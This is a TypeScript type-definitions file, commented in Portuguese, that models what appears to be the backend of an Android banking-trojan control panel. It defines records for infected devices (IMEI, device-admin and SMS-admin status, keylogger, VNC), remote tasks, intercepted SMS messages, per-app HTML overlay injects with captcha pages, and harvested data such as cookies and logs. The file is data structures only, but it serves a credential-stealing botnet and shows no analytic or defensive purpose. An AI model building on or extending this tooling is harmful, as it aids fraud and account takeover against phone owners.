// src/types.ts

export interface Bot {
  id: number;
  bot_id: string;          // ID único do bot (36 caracteres)
  imei: string;
  number: string;
  is_device_admin: boolean;
  is_sms_admin: boolean;
  is_locked: boolean;
  registered: string;      // ISO 8601 date string (timestamp)
  last_seen: string;       // ISO 8601 date string (timestamp)
  ip: string;
  country: string;
  lang: string;
  android: string;
  model: string;
  operator: string;
  tag: string;
  comment?: string;        // Pode ser nulo
  apps: string;            // Lista de pacotes separada por '|'
  is_loader_installed: boolean;
  extra_info_json: string; // JSON string com informações extras
  uptime: number;
  keylogger: boolean;
  vnc: string;
  is_fg: boolean;
}

export interface Task {
  id: number;
  bot_id: string;
  task_type: string;       // Ex: 'start_fg', 'register_again'
  data: string;
  status: string;          // Ex: 'waiting', 'in_process'
}

export interface Config {
  id: number;
  name: string;
  value: string;
  descr: string;
  placeholder: string;
}

export interface Error {
  id: number;
  bot_id: string;
  time: string;            // ISO 8601 date string (timestamp)
  msg: string;
}

export interface PushesBot {
  id: number;
  bot_id: string;
  pkg: string;             // Nome do pacote Android
  enabled: boolean;
}

export interface Smart {
  id: number;
  stype: string;           // 'html' ou 'url'
  sgroup: string;          // Grupo (ex.: 'specials', 'de', 'es')
  package: string;         // Pacote Android ou identificador especial
  data: string;            // Corpo HTML ou URL
  cap_data: string;        // HTML para preenchimento (captcha)
  icon?: Uint8Array | string; // Ícone PNG (binário ou base64)
  is_active: boolean;
}

export interface SmartsBot {
  id: number;
  smart_id: number;        // FK para smarts.id
  bot_id: string;
  is_active: boolean;
}

export interface SmartsData {
  id: number;
  smart_id: number;        // FK para smarts.id
  bot_id: string;
  time: string;            // Timestamp em segundos (varchar)
  data: string;            // Dados coletados (logs, cookies, etc.)
}

export interface Sms {
  id: number;
  bot_id: string;
  number: string;
  time: string;            // Timestamp em segundos (varchar)
  msg: string;
}

export interface VncTask {
  id: number;
  bot_id: string;
  task_type: string;       // Tipo de tarefa VNC (click, gesture, etc.)
  data: string;
}